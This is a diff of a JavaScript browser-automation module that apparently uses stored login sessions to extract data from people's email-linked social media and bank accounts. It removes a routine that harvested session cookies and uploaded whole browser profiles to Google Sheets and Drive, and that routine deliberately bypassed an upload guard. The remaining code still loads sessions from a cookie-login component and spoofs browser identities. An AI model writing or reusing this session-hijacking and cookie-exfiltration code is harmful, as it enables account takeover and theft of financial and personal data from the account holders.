@@ -1,13 +1,11 @@
 import logger from './logger.js';
-import fs from 'fs';
 import MultiProviderAI from './multiProviderAI.js';
 const aiService = new MultiProviderAI();
 import { launchBrowserWithSession, DOMHelpers } from '../app/socials/_shared/routeHelper.js';
 import { applyIdentityToPage } from './identity.js';
 import { getSheetDataApi, updateSheetRowApi, ensureSheetColumns } from '../app/api/googlesheets.js';
 import { getPlatformConfig, getExtractor } from '../app/socials/social-extract/platforms.js';
-import { createOrUpdateJsonFile, getJsonContentFromFile, uploadBrowserDataRaw } from '../app/api/googledrive.mjs';
-import { getCookieCaptureUrls } from '../app/emails/cookie/cookie-api-login/platformHelper/index.js';
+import { createOrUpdateJsonFile, getJsonContentFromFile } from '../app/api/googledrive.mjs';
 
 // ============================================================
 // SMART EXTRACT ENGINE
@@ -1042,25 +1040,11 @@ async function extractWire(session, browserId) {
             },
         };
     } finally {
-        // Capture userDataDir and cookies BEFORE closing browser
-        const userDataDir = browser.userDataDir;
-        let enrichedCookies = [];
-        try {
-            const domain = session.email ? session.email.split('@')[1] : '';
-            const urls = getCookieCaptureUrls(domain);
-            const pages = await browser.pages();
-            const mainPage = pages[0];
-            enrichedCookies = await mainPage.cookies(...urls);
-            logger.info(`[smartExtract] Captured ${enrichedCookies.length} enriched cookies`);
-        } catch (e) {
-            logger.warn(`[smartExtract] Cookie capture failed: ${e.message}`);
-        }
-        // Close browser BEFORE zipping to release file locks
+        // Close browser — do NOT re-upload profile or overwrite cookieJSON.
+        // The original session from cookie-api-login is stronger than
+        // what page.setCookie() creates in a random temp profile.
         await page.close().catch(() => {});
         await browser.close().catch(() => {});
-        // Small delay to let OS release file locks
-        await new Promise(r => setTimeout(r, 1000));
-        await saveEnrichedProfile(session, userDataDir, enrichedCookies);
     }
 }
 
@@ -1164,7 +1148,6 @@ async function extractSocial(session, username, explicitPlatform, browserId) {
         account.detailsExtractedFrom = config.profileUrl || '';
         return [account];
     } finally {
-        await saveEnrichedProfile(session, browser);
         await Promise.all([
             page.close().catch(() => {}),
             tab1?.close().catch(() => {}),
@@ -1289,51 +1272,8 @@ async function extractBank(session, explicitPlatform) {
 
         return bankAccounts;
     } finally {
-        const userDataDir = browser.userDataDir;
         await page.close().catch(() => {});
         await browser.close().catch(() => {});
-        await new Promise(r => setTimeout(r, 1000));
-        await saveEnrichedProfile(session, userDataDir);
-    }
-}
-
-// ==================== Enriched Profile Save ====================
-
-async function saveEnrichedProfile(session, userDataDir, enrichedCookies = []) {
-    try {
-        if (!userDataDir || !fs.existsSync(userDataDir)) {
-            logger.warn(`[smartExtract] No userDataDir found for enriched profile save`);
-            return;
-        }
-
-        // 1. Use pre-captured cookies
-        logger.info(`[smartExtract] Using ${enrichedCookies.length} pre-captured enriched cookies`);
-
-        // 2. Update cookieJSON in the sheet
-        await ensureSheetColumns(COOKIE_SHEET, ['cookieJSON', 'formattedCookie', 'driveUrl', 'cookieFileURL']);
-        const writeResult = await updateSheetRowApi(COOKIE_SHEET, 'browserId', session.browserId, {
-            cookieJSON: JSON.stringify(enrichedCookies),
-            formattedCookie: JSON.stringify(enrichedCookies, null, 2),
-        });
-        if (writeResult.success) {
-            logger.info(`[smartExtract] Updated cookieJSON in sheet for ${session.browserId}`);
-        } else {
-            logger.warn(`[smartExtract] Failed to update cookieJSON: ${writeResult.error}`);
-        }
-
-        // 3. Re-upload enriched profile to Drive (bypass re-upload guard by passing empty updateData)
-        const uploadResult = await uploadBrowserDataRaw(session.browserId, {}, userDataDir);
-        if (uploadResult.ok) {
-            await updateSheetRowApi(COOKIE_SHEET, 'browserId', session.browserId, {
-                driveUrl: uploadResult.url,
-                cookieFileURL: uploadResult.url,
-            });
-            logger.info(`[smartExtract] Re-uploaded enriched profile to Drive for ${session.browserId}`);
-        } else {
-            logger.warn(`[smartExtract] Enriched profile upload failed: ${uploadResult.reason}`);
-        }
-    } catch (e) {
-        logger.warn(`[smartExtract] saveEnrichedProfile error (non-fatal): ${e.message}`);
     }
 }
 
